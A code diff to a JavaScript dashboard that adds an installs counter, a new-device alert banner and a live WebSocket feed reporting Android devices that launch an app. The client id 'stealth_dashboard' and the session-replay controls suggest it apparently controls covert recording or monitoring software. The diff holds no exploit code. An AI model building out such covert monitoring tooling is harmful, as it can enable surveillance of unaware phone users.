@@ -60,10 +60,14 @@ const ui = {
     
     // Stats
     statActive: document.getElementById('stat-active'),
+    statInstalls: document.getElementById('stat-installs'),
     statSessions: document.getElementById('stat-sessions'),
     statChunks: document.getElementById('stat-chunks'),
     statDuration: document.getElementById('stat-duration'),
     statStorage: document.getElementById('stat-storage'),
+    installAlertBanner: document.getElementById('install-alert-banner'),
+    installAlertText: document.getElementById('install-alert-text'),
+    btnCloseInstallAlert: document.getElementById('btn-close-install-alert'),
     
     // Dashboard List
     sessionList: document.getElementById('session-list'),
@@ -107,6 +111,7 @@ let animationId = null;
 document.addEventListener('DOMContentLoaded', () => {
     bindEvents();
     fetchAllData();
+    initWebSocket();
     setInterval(fetchAllData, POLL_INTERVAL);
 });
 
@@ -116,6 +121,9 @@ function bindEvents() {
     ui.btnRewind?.addEventListener('click', rewind15);
     ui.btnJumpLive?.addEventListener('click', jumpToLive);
     ui.btnRefresh?.addEventListener('click', fetchAllData);
+    ui.btnCloseInstallAlert?.addEventListener('click', () => {
+        if (ui.installAlertBanner) ui.installAlertBanner.style.display = 'none';
+    });
 
     if (ui.speedSelect) {
         ui.speedSelect.addEventListener('change', (e) => {
@@ -202,7 +210,58 @@ function setViewMode(mode) {
 }
 
 async function fetchAllData() {
-    await Promise.all([fetchActiveSessions(), fetchStats(), fetchAllSessions(), fetchDeviceStatus()]);
+    await Promise.all([fetchActiveSessions(), fetchStats(), fetchAllSessions(), fetchDeviceStatus(), fetchInstalls()]);
+}
+
+async function fetchInstalls() {
+    try {
+        const res = await fetch(`${API_DASHBOARD}/installs`);
+        if (!res.ok) return;
+        const data = await res.json();
+        if (ui.statInstalls) {
+            ui.statInstalls.textContent = data.total || 0;
+        }
+    } catch (e) {
+        console.error('Installs fetch error:', e);
+    }
+}
+
+function initWebSocket() {
+    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const wsUrl = `${protocol}//${window.location.host}/ws/device?client_id=stealth_dashboard`;
+    try {
+        const ws = new WebSocket(wsUrl);
+        ws.onopen = () => {
+            console.log('[ws] Stealth dashboard connected to real-time events');
+        };
+        ws.onmessage = (event) => {
+            try {
+                const msg = JSON.parse(event.data);
+                if (msg.type === 'new_install' && msg.data) {
+                    handleNewInstallEvent(msg.data);
+                }
+            } catch (e) { }
+        };
+        ws.onclose = () => {
+            setTimeout(initWebSocket, 4000);
+        };
+        ws.onerror = (e) => {
+            console.warn('[ws] Socket warning:', e);
+        };
+    } catch (err) {
+        console.warn('Dashboard live WebSocket error:', err);
+    }
+}
+
+function handleNewInstallEvent(data) {
+    fetchInstalls();
+    if (ui.installAlertBanner && ui.installAlertText) {
+        const model = `${data.manufacturer || 'Android'} ${data.device_model || ''}`.trim();
+        const os = data.os_version ? `(${data.os_version})` : '';
+        ui.installAlertText.textContent = `New App Installation: ${model} ${os} just launched the app!`;
+        ui.installAlertBanner.style.display = 'flex';
+    }
+    showToast(`🎉 New Device Installed: ${data.device_model || 'Device'}`, 'success');
 }
 
 async function fetchDeviceStatus() {
